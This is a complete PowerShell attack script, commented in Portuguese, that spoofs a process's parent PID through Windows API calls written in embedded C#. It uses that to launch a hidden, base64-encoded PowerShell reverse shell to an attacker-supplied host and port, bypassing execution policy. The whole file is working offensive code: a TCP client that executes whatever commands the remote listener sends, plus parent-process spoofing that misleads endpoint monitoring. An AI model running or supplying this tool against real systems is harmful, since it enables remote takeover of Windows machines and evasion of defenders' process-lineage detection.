<#
.SYNOPSIS
    Script para PPID Spoofing com Reverse Shell.
.EXAMPLE
    .\script.ps1 -ppid 1234 -lhost 10.10.17.189 -lport 7444
#>

Param (
    [Parameter(Mandatory=$true)]
    [int]$ppid,

    [Parameter(Mandatory=$true)]
    [string]$lhost,

    [Parameter(Mandatory=$false)]
    [int]$lport = 7444
)

$mycode = @"
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

public class MyProcess
{
    [DllImport("kernel32.dll")]
    static extern uint GetLastError();
    
	[DllImport("kernel32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool CreateProcess(
        string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
        ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags,
        IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UpdateProcThreadAttribute(
        IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue,
        IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool InitializeProcThreadAttributeList(
        IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool DeleteProcThreadAttributeList(IntPtr lpAttributeList);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);
    
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFOEX
    {
        public STARTUPINFO StartupInfo;
        public IntPtr lpAttributeList;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFO
    {
        public Int32 cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr lpSecurityDescriptor;
        public int bInheritHandle;
    }

	public static void CreateProcessFromParent(int ppid, string command, string cmdargs)
    {
        const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
        const uint CREATE_NEW_CONSOLE = 0x00000010;
		const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
		
        var pi = new PROCESS_INFORMATION();
        var si = new STARTUPINFOEX();
        si.StartupInfo.cb = Marshal.SizeOf(si);
        IntPtr lpValue = IntPtr.Zero;
        try
        {
            var lpSize = IntPtr.Zero;
            InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
            si.lpAttributeList = Marshal.AllocHGlobal(lpSize);
            InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, ref lpSize);
            var phandle = Process.GetProcessById(ppid).Handle;
            lpValue = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(lpValue, phandle);
            
            UpdateProcThreadAttribute(
                si.lpAttributeList,
                0,
                (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                lpValue,
                (IntPtr)IntPtr.Size,
                IntPtr.Zero,
                IntPtr.Zero);
            
            var pattr = new SECURITY_ATTRIBUTES();
            var tattr = new SECURITY_ATTRIBUTES();
            pattr.nLength = Marshal.SizeOf(pattr);
            tattr.nLength = Marshal.SizeOf(tattr);
			CreateProcess(command, cmdargs, ref pattr, ref tattr, false, EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, IntPtr.Zero, null, ref si, out pi);
        }
        finally
        {
            if (si.lpAttributeList != IntPtr.Zero)
            {
                DeleteProcThreadAttributeList(si.lpAttributeList);
                Marshal.FreeHGlobal(si.lpAttributeList);
            }
            Marshal.FreeHGlobal(lpValue);
            if (pi.hProcess != IntPtr.Zero) CloseHandle(pi.hProcess);
            if (pi.hThread != IntPtr.Zero) CloseHandle(pi.hThread);
        }
    }
}
"@

function ImpersonateFromParentPid {
    Param ($ppid, $command, $cmdargs)
    if (-not ([System.Management.Automation.PSTypeName]'MyProcess').Type) {
        Add-Type -TypeDefinition $mycode
    }
    [MyProcess]::CreateProcessFromParent($ppid, $command, "$command $cmdargs")
}

# --- Lógica do Payload ---
$client_payload = @"
`$c = New-Object System.Net.Sockets.TCPClient('$lhost',$lport);
`$s = `$c.GetStream();
[byte[]]`$b = 0..65535|%{0};
while((`$i = `$s.Read(`$b, 0, `$b.Length)) -ne 0){
    `$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$b,0, `$i);
    `$sb = (iex `$d 2>&1 | Out-String );
    `$sb2  = `$sb + 'PS ' + (pwd).Path + '> ';
    `$x = ([text.encoding]::ASCII).GetBytes(`$sb2);
    `$s.Write(`$x,0,`$x.Length);
    `$s.Flush();
}
`$c.Close();
"@

$encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($client_payload))

Write-Host "[+] Tentando spoofing do PID $ppid..." -ForegroundColor Cyan
ImpersonateFromParentPid -ppid $ppid -command "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -cmdargs "-ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $encoded"
Write-Host "[+] Processo disparado. Verifique seu listener em $lhost:$lport" -ForegroundColor Green
